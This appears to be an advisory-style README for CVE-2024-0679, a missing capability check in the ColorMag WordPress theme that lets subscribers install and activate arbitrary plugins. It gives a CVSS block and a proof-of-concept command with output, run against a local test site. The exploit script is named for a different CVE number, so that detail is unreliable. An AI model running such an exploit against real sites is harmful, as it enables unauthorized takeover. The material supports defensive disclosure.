# CVE-2024-0679
ColorMag &lt;= 3.1.2 - Missing Authorization to Authenticated (Subscriber+) Arbitrary Plugin Installation/Activation

# Description:
The ColorMag theme for WordPress is vulnerable to unauthorized access due to a missing capability check on the plugin_action_callback() function in all versions up to, and including, 3.1.2. This makes it possible for authenticated attackers, with subscriber-level access and above, to install and activate arbitrary plugins.

```
Severity: medium
CVE ID: CVE-2024-0679
CVSS Score: 6.5
CVSS Metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N
Plugin Slug: colormag
WPScan URL: https://www.wpscan.com/plugin/colormag
Reference URL: https://www.wordfence.com/threat-intel/vulnerabilities/id/e982d457-29db-468f-88c3-5afe04002dcf?source=api-prod
```

POC
---

```
$ python3 CVE-2024-0705.py --url http://wordpress.lan --username user --password useruser1 --slug ai-engine --plugin ai-engine/ai-engine.php
Logged in successfully.
Getting Nonce!
5e0195de06
Installing Plugin!
HTTP STATUS: 200 Response: {"success":true,"data":{"message":"Plugin activated successfully!"}}
```

